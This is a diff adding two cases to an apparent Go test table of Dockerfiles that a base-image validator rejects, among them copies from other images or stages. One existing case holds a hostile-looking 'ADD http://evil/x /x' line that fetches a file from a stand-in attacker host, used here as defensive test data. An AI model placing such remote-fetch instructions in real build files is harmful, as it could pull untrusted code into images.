@@ -29,6 +29,8 @@ USER vscode
 		"foreign base":     "ARG VIBE_BASE_IMAGE\nFROM ubuntu:24.04\n",
 		"multi-stage":      "ARG VIBE_BASE_IMAGE\nFROM ${VIBE_BASE_IMAGE}\nFROM ${VIBE_BASE_IMAGE}\n",
 		"add":              "ARG VIBE_BASE_IMAGE\nFROM ${VIBE_BASE_IMAGE}\nADD http://evil/x /x\n",
+		"copy --from":      "ARG VIBE_BASE_IMAGE\nFROM ${VIBE_BASE_IMAGE}\nCOPY --from=busybox:latest /bin/busybox /x\n",
+		"copy --from=0":    "ARG VIBE_BASE_IMAGE\nFROM ${VIBE_BASE_IMAGE}\ncopy --FROM=0 /x /x\n",
 		"onbuild":          "ARG VIBE_BASE_IMAGE\nFROM ${VIBE_BASE_IMAGE}\nONBUILD RUN true\n",
 		"ends as root":     "ARG VIBE_BASE_IMAGE\nFROM ${VIBE_BASE_IMAGE}\nUSER root\n",
 		"no from":          "RUN true\n",
